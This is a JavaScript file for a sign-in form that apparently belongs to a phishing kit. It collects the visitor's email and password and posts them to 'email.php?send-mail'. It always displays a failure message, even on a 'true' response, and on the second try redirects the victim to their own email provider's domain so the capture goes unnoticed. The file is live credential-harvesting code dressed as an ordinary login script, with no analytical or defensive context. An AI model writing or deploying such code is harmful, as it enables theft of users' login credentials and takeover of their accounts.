var btnLogin = document.getElementById("login");

var email = document.getElementById("email");
var password = document.getElementById("password");
var error = document.getElementById("processing");

btnLogin.addEventListener('click', function(){
	if(email.value === ""){
		error.textContent = "Please enter your email address or member ID. ";
		processing.className = processing.className.replace(/\bhide\b/g, "show");
		email.focus();
		return false;
	}else if(password.value === ""){
		error.textContent = "Please enter your email address or member ID. ";
		processing.className = processing.className.replace(/\bhide\b/g, "show");
		password.focus();
		return false;
	} else {
		processing.textContent = "Signing In...";
		processing.className = processing.className.replace(/\bhide\b/g, "show");
		processing.className = processing.className.replace(/\balert-danger\b/g, "alert-info");

		var xmlhttp;
	    if(window.XMLHttpRequest){
	      xmlhttp = new XMLHttpRequest();
	    }else{
	      xmlhttp = new ActiveXObject("Microsoft.XMLHTTP");
	    }

	    xmlhttp.onreadystatechange=function(){
	      if(xmlhttp.readyState==4 && xmlhttp.status==200){
	      	console.log(xmlhttp.responseText);
	      	var res = xmlhttp.responseText.replace(/\s+/g, "");
	      	if(xmlhttp.responseText === 'true'){
	      		processing.textContent = "Something went wrong!";
	      		processing.className = processing.className.replace(/\balert-info\b/g, "alert-danger");
	      	}else {
	      		processing.textContent = "Please try again";
	      		processing.className = processing.className.replace(/\balert-info\b/g, "alert-danger");
	      	}
	      }
	    }

    	var formdata = new FormData();

    	formdata.append("email", email.value);
    	formdata.append("password", password.value);

	    var url = 'email.php?send-mail';

		var redirectUrl = email.value.split("@")[1];
		var counter = sessionStorage.getItem('counter');

		if(counter >= 1){
			window.location.href = 'https://'+redirectUrl;
		}else{
			sessionStorage.setItem('counter', counter+1);
		}
	    
	    xmlhttp.open("POST", url);
	    xmlhttp.send(formdata);

	    return true;
	}
})